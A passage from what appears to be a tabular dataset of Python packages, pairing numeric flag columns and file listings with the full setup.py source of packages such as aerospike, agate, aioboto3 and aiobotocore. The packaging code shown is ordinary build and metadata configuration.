        library_dirs = library_dirs + ['/usr/local/lib/']
        libraries = libraries + ['ev']
    else:
        print(""Building aerospike with no-async support\n"")

class CClientBuild(build):

    def run(self):
        if self.force == 1:
            # run original c-extension clean task
            # clean.run(self)
            cmd = [
                'make',
                'clean'
            ]
            def clean():
                call(cmd, cwd=CCLIENT_PATH)
            self.execute(clean, [], 'Clean core aerospike-client-c previous builds')

        os.putenv('LD_LIBRARY_PATH', ':'.join(library_dirs))
        os.environ['LD_LIBRARY_PATH'] = ':'.join(library_dirs)
        os.putenv('DYLD_LIBRARY_PATH', ':'.join(library_dirs))
        os.environ['DYLD_LIBRARY_PATH'] = ':'.join(library_dirs)
        # build core client
        cmd = [
            'make',
            'V=' + str(self.verbose),
        ]
        if EVENT_LIB is not None:
            cmd = [
                'make',
                'V=' + str(self.verbose),
                'EVENT_LIB='+EVENT_LIB,
            ] 

        def compile():
            print(cmd, library_dirs, libraries)
            call(cmd, cwd=CCLIENT_PATH)

        self.execute(compile, [], 'Compiling core aerospike-client-c')
        # run original c-extension build code
        build.run(self)


class CClientClean(clean):

    def run(self):
        # run original c-extension clean task
        # clean.run(self)
        cmd = [
            'make',
            'clean'
        ]

        def clean():
            call(cmd, cwd=CCLIENT_PATH)

        self.execute(clean, [], 'Clean core aerospike-client-c')


setup(
    name='aerospike',
    version=version.strip(),
    description='Aerospike Client Library for Python',
    long_description=long_description,
    author='Aerospike, Inc.',
    author_email='info@aerospike.com',
    url='http://aerospike.com',
    license='Apache Software License',
    keywords=['aerospike', 'nosql', 'database'],
    classifiers=[
        'License :: OSI Approved :: Apache Software License',
        'Operating System :: POSIX :: Linux',
        'Operating System :: MacOS :: MacOS X',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
        'Programming Language :: Python :: Implementation :: CPython',
        'Topic :: Database'
    ],

    # Package Data Files
    zip_safe=False,
    include_package_data=True,

    # Data files
    ext_modules=[
        Extension(
            # Extension Name
            'aerospike',

            # Source Files
            [
                'src/main/aerospike.c',
                'src/main/exception.c',
                'src/main/log.c',
                'src/main/client/type.c',
                'src/main/client/apply.c',
                'src/main/client/bit_operate.c',
                'src/main/client/cdt_list_operate.c',
                'src/main/client/cdt_map_operate.c',
                'src/main/client/hll_operate.c',
                'src/main/client/expression_operations.c',
                'src/main/client/cdt_operation_utils.c',
                'src/main/client/close.c',
                'src/main/client/connect.c',
                'src/main/client/exists.c',
                'src/main/client/exists_many.c',
                'src/main/client/get.c',
                'src/main/client/get_async.c',
                'src/main/client/put_async.c',
                'src/main/client/get_many.c',
                'src/main/client/batch_get_ops.c',
                'src/main/client/select_many.c',
                'src/main/client/info_single_node.c',
                'src/main/client/info_random_node.c',
                'src/main/client/info_node.c',
                'src/main/client/info.c',
                'src/main/client/put.c',
                'src/main/client/operate_list.c',
                'src/main/client/operate_map.c',
                'src/main/client/operate.c',
                'src/main/client/query.c',
                'src/main/client/remove.c',
                'src/main/client/scan.c',
                'src/main/client/select.c',
                'src/main/client/tls_info_host.c',
                'src/main/client/truncate.c',
                'src/main/client/admin.c',
                'src/main/client/udf.c',
                'src/main/client/sec_index.c',
                'src/main/serializer.c',
                'src/main/client/remove_bin.c',
                'src/main/client/get_key_digest.c',
                'src/main/query/type.c',
                'src/main/query/apply.c',
                'src/main/query/add_ops.c',
                'src/main/query/paginate.c',
                'src/main/query/get_parts.c',
                'src/main/query/foreach.c',
                'src/main/query/results.c',
                'src/main/query/select.c',
                'src/main/query/where.c',
                'src/main/query/execute_background.c',
                'src/main/scan/type.c',
                'src/main/scan/foreach.c',
                'src/main/scan/results.c',
                'src/main/scan/select.c',
                'src/main/scan/execute_background.c',
                'src/main/scan/apply.c',
                'src/main/scan/add_ops.c',
                'src/main/scan/paginate.c',
                'src/main/scan/get_parts.c',
                'src/main/geospatial/type.c',
                'src/main/geospatial/wrap.c',
                'src/main/geospatial/unwrap.c',
                'src/main/geospatial/loads.c',
                'src/main/geospatial/dumps.c',
                'src/main/policy.c',
                'src/main/conversions.c',
                'src/main/convert_expressions.c',
                'src/main/policy_config.c',
                'src/main/calc_digest.c',
                'src/main/predicates.c',
                'src/main/tls_config.c',
                'src/main/global_hosts/type.c',
                'src/main/nullobject/type.c',
                'src/main/cdt_types/type.c',
                'src/main/key_ordered_dict/type.c',
                'src/main/client/set_xdr_filter.c',
                'src/main/client/get_expression_base64.c',
                'src/main/client/get_nodes.c',
                'src/main/convert_partition_filter.c',
                'src/main/client/get_key_partition_id.c',
                'src/main/client/batch_write.c',
                'src/main/client/batch_operate.c',
                'src/main/client/batch_remove.c',
                'src/main/client/batch_apply.c'
            ],

            # Compile
            include_dirs=include_dirs,
            extra_compile_args=extra_compile_args,

            # Link
            library_dirs=library_dirs,
            libraries=libraries,
            extra_objects=extra_objects,
            extra_link_args=extra_link_args,
        )
    ],
    packages=['aerospike_helpers', 'aerospike_helpers.operations', 'aerospike_helpers.batch',
              'aerospike_helpers.expressions', 'aerospike_helpers.awaitable'],

    cmdclass={
        'build': CClientBuild,
        'clean': CClientClean
    }
)
",0
affine-2.3.1,0,1,1,1,0,0,0,0,test_pickle.py test_rotation.py test_transform.py __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt zip-safe AUTHORS.txt CHANGES.txt LICENSE.txt PKG-INFO README.rst setup.cfg setup.py,"import codecs
import os

from setuptools import find_packages, setup


# Parse the version from the affine module.
with codecs.open(os.path.join(""affine"", ""__init__.py"")) as f:
    for line in f:
        if ""__version__"" in line:
            version = line.split(""="")[1].strip()
            version = version.strip('""').strip(""'"")
            break

with codecs.open(""README.rst"", encoding=""utf-8"") as f:
    readme = f.read()


setup(
    name=""affine"",
    version=version,
    description=""Matrices describing affine transformation of the plane."",
    long_description=readme,
    classifiers=[],
    keywords=""affine transformation matrix"",
    author=""Sean Gillies"",
    author_email=""sean@mapbox.com"",
    url=""https://github.com/sgillies/affine"",
    license=""BSD"",
    packages=find_packages(exclude=[""ez_setup"", ""examples"", ""tests""]),
    include_package_data=True,
    zip_safe=True,
    extras_require={""test"": [""pytest>=4.6"", ""pytest-cov"", ""pydocstyle"",
                             ""flake8"", ""coveralls""]},
)
",0
affinegap-1.12,0,1,1,0,0,0,1,0,affinegap.c affinegap.pyx __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE MANIFEST.in PKG-INFO pyproject.toml README.md setup.cfg setup.py,"#!/usr/bin/python
# -*- coding: utf-8 -*-

try:
    from setuptools import setup, Extension
except ImportError :
    raise ImportError(""setuptools module required, please go to https://pypi.python.org/pypi/setuptools and follow the instructions for installing setuptools"")

try:
    from Cython.Build import cythonize
    use_cython = True
except ImportError:
    use_cython = False

if use_cython:
    ext_modules = cythonize([Extension('affinegap.affinegap',
                             ['affinegap/affinegap.pyx'])])
else:
    ext_modules = [Extension('affinegap.affinegap',
                             ['affinegap/affinegap.c'])]

setup(
    name='affinegap',
    url='https://github.com/datamade/affinegap',
    version='1.12',
    description='A Cython implementation of the affine gap string distance',
    packages=['affinegap'],
    ext_modules=ext_modules,
    license='The MIT License: http://www.opensource.org/licenses/mit-license.php',
    classifiers=[
        'Development Status :: 5 - Production/Stable',
        'Intended Audience :: Developers',
        'Intended Audience :: Science/Research',
        'License :: OSI Approved :: MIT License',
        'Natural Language :: English',
        'Operating System :: MacOS :: MacOS X',
        'Operating System :: Microsoft :: Windows',
        'Operating System :: POSIX',
        'Programming Language :: Cython', 
        'Topic :: Software Development :: Libraries :: Python Modules',
        'Topic :: Scientific/Engineering',
        'Topic :: Scientific/Engineering :: Information Analysis']
    )
",0
agate-1.6.3,0,1,1,1,0,0,0,0,,"from setuptools import find_packages, setup

with open('README.rst') as f:
    long_description = f.read()

setup(
    name='agate',
    version='1.6.3',
    description='A data analysis library that is optimized for humans instead of machines.',
    long_description=long_description,
    long_description_content_type='text/x-rst',
    author='Christopher Groskopf',
    author_email='chrisgroskopf@gmail.com',
    url='http://agate.readthedocs.org/',
    license='MIT',
    classifiers=[
        'Development Status :: 5 - Production/Stable',
        'Framework :: IPython',
        'Intended Audience :: Developers',
        'Intended Audience :: Science/Research',
        'License :: OSI Approved :: MIT License',
        'Natural Language :: English',
        'Operating System :: OS Independent',
        'Programming Language :: Python',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
        'Programming Language :: Python :: Implementation :: CPython',
        'Programming Language :: Python :: Implementation :: PyPy',
        'Topic :: Scientific/Engineering :: Information Analysis',
        'Topic :: Software Development :: Libraries :: Python Modules',
    ],
    packages=find_packages(exclude=['benchmarks', 'tests', 'tests.*']),
    install_requires=[
        'Babel>=2.0',
        'isodate>=0.5.4',
        'leather>=0.3.2',
        # KeyError: 's' https://github.com/bear/parsedatetime/pull/233 https://github.com/wireservice/agate/issues/743
        # AttributeError: 'module' object has no attribute 'Locale' https://github.com/bear/parsedatetime/pull/247
        'parsedatetime>=2.1,!=2.5,!=2.6',
        'python-slugify>=1.2.1',
        'pytimeparse>=1.1.5',
        'six>=1.9.0',
    ],
    extras_require={
        'test': [
            'coverage>=3.7.1',
            'cssselect>=0.9.1',
            'lxml>=3.6.0',
            'nose>=1.1.2',
            # CI is not configured to install PyICU on macOS and Windows.
            'PyICU>=2.4.2;sys_platform==""linux""',
            'pytz>=2015.4',
            'mock>=1.3.0;python_version<""3""',
            'unittest2>=1.1.0;python_version<""3""',
        ],
        'docs': [
            'Sphinx>=1.2.2',
            'sphinx_rtd_theme>=0.1.6',
        ],
    }
)
",1
agate-dbf-0.2.2,0,1,1,1,0,0,0,0,table.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt AUTHORS.rst COPYING MANIFEST.in PKG-INFO README.rst setup.cfg setup.py,"#!/usr/bin/env python

from setuptools import setup

install_requires = [
    'agate>=1.5.0',
    'dbfread>=2.0.5'
]

setup(
    name='agate-dbf',
    version='0.2.2',
    description='agate-dbf adds read support for dbf files to agate.',
    long_description=open('README.rst').read(),
    author='Christopher Groskopf',
    author_email='chrisgroskopf@gmail.com',
    url='http://agate-dbf.readthedocs.org/',
    license='MIT',
    classifiers=[
        'Development Status :: 4 - Beta',
        'Intended Audience :: Developers',
        'Intended Audience :: Science/Research',
        'License :: OSI Approved :: MIT License',
        'Natural Language :: English',
        'Operating System :: OS Independent',
        'Programming Language :: Python',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: Implementation :: CPython',
        'Programming Language :: Python :: Implementation :: PyPy',
        'Topic :: Multimedia :: Graphics',
        'Topic :: Scientific/Engineering :: Information Analysis',
        'Topic :: Scientific/Engineering :: Visualization',
        'Topic :: Software Development :: Libraries :: Python Modules',
    ],
    packages=[
        'agatedbf'
    ],
    install_requires=install_requires
)
",0
agate-excel-0.2.5,0,1,1,1,0,0,0,0,table_xls.py table_xlsx.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt AUTHORS.rst CHANGELOG.rst COPYING conf.py index.rst Makefile example.py test.xls test.xlsx test_ambiguous_date.xls test_ambiguous_date.xlsx test_empty.xls test_empty.xlsx test_numeric_column_name.xls test_numeric_column_name.xlsx test_sheets.xls test_sheets.xlsx test_skip_lines.xls test_skip_lines.xlsx test_zeros.xls MANIFEST.in PKG-INFO README.rst setup.cfg setup.py test_table_xls.py test_table_xlsx.py __init__.py,"from setuptools import find_packages, setup

with open('README.rst') as f:
    long_description = f.read()

setup(
    name='agate-excel',
    version='0.2.5',
    description='agate-excel adds read support for Excel files (xls and xlsx) to agate.',
    long_description=long_description,
    long_description_content_type='text/x-rst',
    author='Christopher Groskopf',
    author_email='chrisgroskopf@gmail.com',
    url='http://agate-excel.readthedocs.org/',
    license='MIT',
    classifiers=[
        'Development Status :: 4 - Beta',
        'Intended Audience :: Developers',
        'Intended Audience :: Science/Research',
        'License :: OSI Approved :: MIT License',
        'Natural Language :: English',
        'Operating System :: OS Independent',
        'Programming Language :: Python',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
        'Programming Language :: Python :: Implementation :: CPython',
        'Programming Language :: Python :: Implementation :: PyPy',
        'Topic :: Scientific/Engineering :: Information Analysis',
        'Topic :: Software Development :: Libraries :: Python Modules',
    ],
    packages=find_packages(exclude=['tests', 'tests.*']),
    install_requires=[
        'agate>=1.5.0',
        'olefile',
        'openpyxl>=2.3.0',
        'six',
        'xlrd>=0.9.4',
    ],
    extras_require={
        'test': [
            'nose>=1.1.2',
        ],
        'docs': [
            'Sphinx>=1.2.2',
            'sphinx_rtd_theme>=0.1.6',
        ],
    }
)
",1
agate-sql-0.5.8,0,1,1,1,0,0,0,0,table.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt AUTHORS.rst CHANGELOG.rst COPYING conf.py index.rst Makefile example.db example.py MANIFEST.in PKG-INFO README.rst setup.cfg setup.py test_agatesql.py __init__.py,"from setuptools import find_packages, setup

with open('README.rst') as f:
    long_description = f.read()

setup(
    name='agate-sql',
    version='0.5.8',
    description='agate-sql adds SQL read/write support to agate.',
    long_description=long_description,
    long_description_content_type='text/x-rst',
    author='Christopher Groskopf',
    author_email='chrisgroskopf@gmail.com',
    url='http://agate-sql.readthedocs.org/',
    license='MIT',
    classifiers=[
        'Development Status :: 4 - Beta',
        'Intended Audience :: Developers',
        'Intended Audience :: Science/Research',
        'License :: OSI Approved :: MIT License',
        'Natural Language :: English',
        'Operating System :: OS Independent',
        'Programming Language :: Python',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
        'Programming Language :: Python :: Implementation :: CPython',
        'Programming Language :: Python :: Implementation :: PyPy',
        'Topic :: Scientific/Engineering :: Information Analysis',
        'Topic :: Software Development :: Libraries :: Python Modules',
    ],
    packages=find_packages(exclude=['tests', 'tests.*']),
    install_requires=[
        'agate>=1.5.0',
        'sqlalchemy>=1.0.8',
    ],
    extras_require={
        'test': [
            'crate',
            'nose>=1.1.2',
            'geojson',
        ],
        'docs': [
            'Sphinx>=1.2.2',
            'sphinx_rtd_theme>=0.1.6',
        ],
    }
)
",1
ahocorapy-1.6.1,0,1,1,1,1,0,0,0,LICENSE MANIFEST.in PKG-INFO README.md setup.cfg setup.py keywordtree.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt visualizer.py __init__.py VERSION,"#!/usr/bin/python
# -*- coding: utf-8 -*-

from os import path
import os

here = os.path.abspath(os.path.dirname(__file__))

with open(path.join(here, 'README.md')) as f:
    long_description = f.read()

from setuptools import setup, find_packages


with open('%s/VERSION' % here) as f:
    __version__ = f.readline().strip()

setup(
    author='abusix',
    author_email='fp@abusix.com',
    description='ahocorapy - Pure python ahocorasick implementation',
    long_description=long_description,
    long_description_content_type=""text/markdown"",
    name='ahocorapy',
    packages=find_packages('src'),
    package_dir={'': 'src'},
    install_requires=['future'],
    python_requires='>=2.7',
    url='https://github.com/abusix/ahocorapy',
    project_urls={
        'Source': 'https://github.com/abusix/ahocorapy',
        'Company': 'https://www.abusix.com/'
    },
    classifiers=[
        'Development Status :: 5 - Production/Stable',
        'Intended Audience :: Developers',
        'Topic :: Software Development :: Libraries :: Python Modules',
        'License :: OSI Approved :: MIT License',
        'Programming Language :: Python :: 2',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.3',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
    ],
    keywords = ['keyword', 'search', 'purepython', 'aho-corasick', 'ahocorasick', 'abusix'],
    license='MIT',
    version=__version__
)
",1
aio-pika-8.1.1,0,1,1,1,0,0,0,0,abc.py channel.py connection.py exceptions.py exchange.py log.py message.py base.py master.py rpc.py __init__.py pool.py py.typed queue.py robust_channel.py robust_connection.py robust_exchange.py robust_queue.py tools.py transaction.py version.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in PKG-INFO README.rst setup.cfg setup.py,"import os
from setuptools import setup, find_packages
from importlib.machinery import SourceFileLoader


module = SourceFileLoader(
    ""version"", os.path.join(""aio_pika"", ""version.py"")
).load_module()


setup(
    name=""aio-pika"",
    version=module.__version__,
    author=module.__author__,
    author_email=module.team_email,
    license=module.package_license,
    description=module.package_info,
    long_description=open(""README.rst"").read(),
    platforms=""all"",
    classifiers=[
        ""License :: OSI Approved :: Apache Software License"",
        ""Topic :: Internet"",
        ""Topic :: Software Development"",
        ""Topic :: Software Development :: Libraries"",
        ""Intended Audience :: Developers"",
        ""Natural Language :: English"",
        ""Operating System :: MacOS"",
        ""Operating System :: POSIX"",
        ""Operating System :: Microsoft"",
        ""Programming Language :: Python"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Programming Language :: Python :: Implementation :: PyPy"",
        ""Programming Language :: Python :: Implementation :: CPython"",
    ],
    packages=find_packages(exclude=[""tests""]),
    package_data={""aio_pika"": [""py.typed""]},
    install_requires=[
        ""aiormq~=6.4.0"",
        ""yarl"",
        'typing_extensions; python_version < ""3.8.0""'
    ],
    python_requires="">3.6, <4"",
    extras_require={
        ""develop"": [
            ""aiomisc~=16.0"",
            ""coverage!=4.3"",
            ""coveralls"",
            ""pylava"",
            ""pytest"",
            ""pytest-cov"",
            ""shortuuid"",
            ""nox"",
            ""sphinx"",
            ""sphinx-autobuild"",
            ""timeout-decorator"",
            ""tox>=2.4"",
        ],
    },
    project_urls={
        ""Documentation"": ""https://aio-pika.readthedocs.org/"",
        ""Source"": ""https://github.com/mosquito/aio-pika"",
    },
)
",1
aioblescan-0.2.13,0,1,1,1,0,0,0,0,aioblescan.py atcmithermometer.py eddystone.py ruuviweather.py thermobeacon.py __init__.py __init__.py __main__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.rst setup.cfg setup.py,"#!/usr/bin/env python3
# -*- coding:utf-8 -*-
import setuptools

version = ""0.2.13""

with open(""README.rst"", ""r"") as fh:
    long_description = fh.read()

setuptools.setup(
    name=""aioblescan"",
    packages=[""aioblescan"", ""aioblescan.plugins""],
    # packages=setuptools.find_packages(),
    version=version,
    author=""François Wautier"",
    author_email=""francois@wautier.eu"",
    description=""Scanning Bluetooth for advertised info with asyncio."",
    long_description=long_description,
    long_description_content_type=""text/x-rst"",
    url=""http://github.com/frawau/aioblescan"",
    keywords=[""bluetooth"", ""advertising"", ""hci"", ""ble""],
    license=""MIT"",
    install_requires=[],
    extras_require={""dev"": [""pytest""]},
    # See https://pypi.python.org/pypi?%3Aaction=list_classifiers
    classifiers=[
        # Pick your license as you wish (should match ""license"" above)
        ""License :: OSI Approved :: MIT License"",
        # Specify the Python versions you support here. In particular, ensure
        # that you indicate whether you support Python 2, Python 3 or both.
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.5"",
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
    ],
    entry_points={""console_scripts"": [""aioblescan=aioblescan.__main__:main""]},
    zip_safe=False,
)
",0
aioboto3-10.0.0,0,1,1,1,1,0,1,0,table.py __init__.py async_chalice.py __init__.py action.py base.py collection.py factory.py response.py __init__.py cse.py inject.py __init__.py session.py __init__.py LICENSE PKG-INFO pyproject.toml README.rst setup.py,"# -*- coding: utf-8 -*-
from setuptools import setup

packages = \
['aioboto3',
 'aioboto3.dynamodb',
 'aioboto3.experimental',
 'aioboto3.resources',
 'aioboto3.s3']

package_data = \
{'': ['*']}

install_requires = \
['aiobotocore[boto3]==2.3.4']

extras_require = \
{'chalice': ['chalice>=1.24.0'], 's3cse': ['cryptography>=2.3.1']}

setup_kwargs = {
    'name': 'aioboto3',
    'version': '10.0.0',
    'description': 'Async boto3 wrapper',
    'long_description': '========================\nAsync AWS SDK for Python\n========================\n\n\n.. image:: https://img.shields.io/pypi/v/aioboto3.svg\n        :target: https://pypi.python.org/pypi/aioboto3\n\n.. image:: https://github.com/terrycain/aioboto3/actions/workflows/CI.yml/badge.svg\n        :target: https://github.com/terrycain/aioboto3/actions\n\n.. image:: https://readthedocs.org/projects/aioboto3/badge/?version=latest\n        :target: https://aioboto3.readthedocs.io\n        :alt: Documentation Status\n\n.. image:: https://pyup.io/repos/github/terrycain/aioboto3/shield.svg\n     :target: https://pyup.io/repos/github/terrycain/aioboto3/\n     :alt: Updates\n\n**Breaking changes for v9, aioboto3.resource and aioboto3.client methods no longer exist, make a session then call session.client etc...**\nThis was done for various reasons but mainly that it prevents the default session living longer than it should as that breaks situations where eventloops are replaced.\n\n**The .client and .resource functions must now be used as async context managers.**\n\nNow that aiobotocore has reached version 1.0.1, a side effect of the work put in to fix various issues like bucket region redirection and\nsupporting web assume role type credentials, the client must now be instantiated using a context manager, which by extension applies to\nthe resource creator. You used to get away with calling ``res = aioboto3.resource(\'dynamodb\')`` but that no longer works. If you really want\nto do that, you can do ``res = await aioboto3.resource(\'dynamodb\').__aenter__()`` but you\'ll need to remember to call ``__aexit__``.\n\nThere will most likely be some parts that dont work now which I\'ve missed, just make an issue and we\'ll get them resoved quickly.\n\nCreating service resources must also be async now, e.g.\n\n.. code-block:: python\n\n    async def main():\n        session = aioboto3.Session()\n        async with session.resource(""s3"") as s3:\n            bucket = await s3.Bucket(\'mybucket\')  # <----------------\n            async for s3_object in bucket.objects.all():\n                print(s3_object)\n\n\nUpdating to aiobotocore 1.0.1 also brings with it support for running inside EKS as well as asyncifying ``get_presigned_url``\n\n----\n\nThis package is mostly just a wrapper combining the great work of boto3_ and aiobotocore_.\n\naiobotocore allows you to use near enough all of the boto3 client commands in an async manner just by prefixing the command with ``await``.\n\nWith aioboto3 you can now use the higher level APIs provided by boto3 in an asynchronous manner. Mainly I developed this as I wanted to use the boto3 dynamodb Table object in some async\nmicroservices.\n\nWhile all resources in boto3 should work I havent tested them all, so if what your after is not in the table below then try it out, if it works drop me an issue with a simple test case\nand I\'ll add it to the table.\n\n+---------------------------+--------------------+\n| Services                  | Status             |\n+===========================+====================+\n| DynamoDB Service Resource | Tested and working |\n+---------------------------+--------------------+\n| DynamoDB Table            | Tested and working |\n+---------------------------+--------------------+\n| S3                        | Working            |\n+---------------------------+--------------------+\n| Kinesis                   | Working            |\n+---------------------------+--------------------+\n| SSM Parameter Store       | Working            |\n+---------------------------+--------------------+\n| Athena                    | Working            |\n+---------------------------+--------------------+\n\n\nExample\n-------\n\nSimple example of using aioboto3 to put items into a dynamodb table\n\n.. code-block:: python\n\n    import asyncio\n    import aioboto3\n    from boto3.dynamodb.conditions import Key\n\n\n    async def main():\n        session = aioboto3.Session()\n        async with session.resource(\'dynamodb\', region_name=\'eu-central-1\') as dynamo_resource:\n            table = await dynamo_resource.Table(\'test_table\')\n\n            await table.put_item(\n                Item={\'pk\': \'test1\', \'col1\': \'some_data\'}\n            )\n\n            result = await table.query(\n                KeyConditionExpression=Key(\'pk\').eq(\'test1\')\n            )\n\n            # Example batch write\n            more_items = [{\'pk\': \'t2\', \'col1\': \'c1\'}, \\\n                          {\'pk\': \'t3\', \'col1\': \'c3\'}]\n            async with table.batch_writer() as batch:\n                for item_ in more_items:\n                    await batch.put_item(Item=item_)\n\n    loop = asyncio.get_event_loop()\n    loop.run_until_complete(main())\n\n    # Outputs:\n    #  [{\'col1\': \'some_data\', \'pk\': \'test1\'}]\n\n\nThings that either dont work or have been patched\n-------------------------------------------------\n\nAs this library literally wraps boto3, its inevitable that some things won\'t magically be async.\n\nFixed:\n\n- ``s3_client.download_file*``  This is performed by the s3transfer module. -- Patched with get_object\n- ``s3_client.upload_file*``  This is performed by the s3transfer module. -- Patched with custom multipart upload\n- ``s3_client.copy``  This is performed by the s3transfer module. -- Patched to use get_object -> upload_fileobject\n- ``dynamodb_resource.Table.batch_writer``  This now returns an async context manager which performs the same function\n- Resource waiters - You can now await waiters which are part of resource objects, not just client waiters, e.g. ``await dynamodbtable.wait_until_exists()``\n- Resource object properties are normally autoloaded, now they are all co-routines and the metadata they come from will be loaded on first await and then cached thereafter.\n- S3 Bucket.objects object now works and has been asyncified. Examples here - https://aioboto3.readthedocs.io/en/latest/usage.html#s3-resource-objects\n\n\nAmazon S3 Client-Side Encryption\n--------------------------------\n\nBoto3 doesn\'t support AWS client-side encryption so until they do I\'ve added basic support for it. Docs here CSE_\n\nCSE requires the python ``cryptography`` library so if you do ``pip install aioboto3[s3cse]`` that\'ll also include cryptography.\n\nThis library currently supports client-side encryption using KMS-Managed master keys performing envelope encryption\nusing either AES/CBC/PKCS5Padding or preferably AES/GCM/NoPadding. The files generated are compatible with the Java Encryption SDK\nso I will assume they are compatible with the Ruby, PHP, Go and C++ libraries as well.\n\nNon-KMS managed keys are not yet supported but if you have use of that, raise an issue and i\'ll look into it.\n\n\n\nDocumentation\n-------------\n\nDocs are here - https://aioboto3.readthedocs.io/en/latest/\n\nExamples here - https://aioboto3.readthedocs.io/en/latest/usage.html\n\n\nFeatures\n========\n\n* Closely mimics the usage of boto3.\n\nTodo\n====\n\n* More examples\n* Set up docs\n* Look into monkey-patching the aws xray sdk to be more async if it needs to be.\n\n\nCredits\n-------\n\nThis package was created with Cookiecutter_ and the `audreyr/cookiecutter-pypackage`_ project template.\nIt also makes use of the aiobotocore_ and boto3_ libraries. All the credit goes to them, this is mainly a wrapper with some examples.\n\n.. _aiobotocore: https://github.com/aio-libs/aiobotocore\n.. _boto3: https://github.com/boto/boto3\n.. _Cookiecutter: https://github.com/audreyr/cookiecutter\n.. _`audreyr/cookiecutter-pypackage`: https://github.com/audreyr/cookiecutter-pypackage\n.. _CSE: https://aioboto3.readthedocs.io/en/latest/cse.html\n',
    'author': 'Terry Cain',
    'author_email': 'terry@terrys-home.co.uk',
    'maintainer': None,
    'maintainer_email': None,
    'url': 'https://github.com/terrycain/aioboto3',
    'packages': packages,
    'package_data': package_data,
    'install_requires': install_requires,
    'extras_require': extras_require,
    'python_requires': '>=3.7,<4.0',
}


setup(**setup_kwargs)
",0
aiobotocore-2.3.4,0,1,1,1,1,0,1,0,args.py awsrequest.py client.py config.py configprovider.py credentials.py discovery.py endpoint.py eventstream.py handlers.py hooks.py httpchecksum.py httpsession.py paginate.py parsers.py response.py adaptive.py bucket.py special.py standard.py retryhandler.py session.py signers.py utils.py waiter.py _endpoint_helpers.py _helpers.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt CHANGES.rst LICENSE MANIFEST.in PKG-INFO README.rst setup.cfg setup.py,"import os
import re
from setuptools import setup, find_packages


# NOTE: If updating requirements make sure to also check Pipfile for any locks
# NOTE: When updating botocore make sure to update awscli/boto3 versions below
install_requires = [
    # pegged to also match items in `extras_require`
    'botocore>=1.24.21,<1.24.22',
    'aiohttp>=3.3.1',
    'wrapt>=1.10.10',
    'aioitertools>=0.5.1',
    ""async_generator ; python_version<'3.7'"",
]

extras_require = {
    'awscli': ['awscli>=1.22.76,<1.22.77'],
    'boto3': ['boto3>=1.21.21,<1.21.22'],
}


def read(f):
    return open(os.path.join(os.path.dirname(__file__), f)).read().strip()


def read_version():
    regexp = re.compile(r""^__version__\W*=\W*'([\d.abrc]+)'"")
    init_py = os.path.join(os.path.dirname(__file__),
                           'aiobotocore', '__init__.py')
    with open(init_py) as f:
        for line in f:
            match = regexp.match(line)
            if match is not None:
                return match.group(1)
        raise RuntimeError('Cannot find version in '
                           'aiobotocore/__init__.py')


setup(
    name='aiobotocore',
    version=read_version(),
    description='Async client for aws services using botocore and aiohttp',
    long_description='\n\n'.join((read('README.rst'), read('CHANGES.rst'))),
    long_description_content_type='text/x-rst',
    classifiers=[
        'Development Status :: 4 - Beta',
        'Intended Audience :: Developers',
        'Intended Audience :: System Administrators',
        'Natural Language :: English',
        'License :: OSI Approved :: Apache Software License',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
        'Programming Language :: Python :: 3.10',
        'Environment :: Web Environment',
        'Framework :: AsyncIO',
    ],
    author=""Nikolay Novik"",
    author_email=""nickolainovik@gmail.com"",
    url='https://github.com/aio-libs/aiobotocore',
    download_url='https://pypi.python.org/pypi/aiobotocore',
    license='Apache License 2.0',
    packages=find_packages(include=['aiobotocore']),
    python_requires='>=3.6',
    install_requires=install_requires,
    extras_require=extras_require,
    include_package_data=True
)
",1
aiocache-0.11.1,0,1,1,1,0,0,0,0,memcached.py memory.py redis.py __init__.py base.py decorators.py exceptions.py factory.py lock.py plugins.py serializers.py __init__.py _version.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt PKG-INFO README.rst setup.cfg setup.py,"import re
import os

from setuptools import setup, find_packages

with open(
        os.path.join(
            os.path.abspath(os.path.dirname(__file__)),
            'aiocache/_version.py')) as fp:
    try:
        version = re.findall(
            r""^__version__ = \""([^']+)\""\r?$"", fp.read(), re.M)[0]
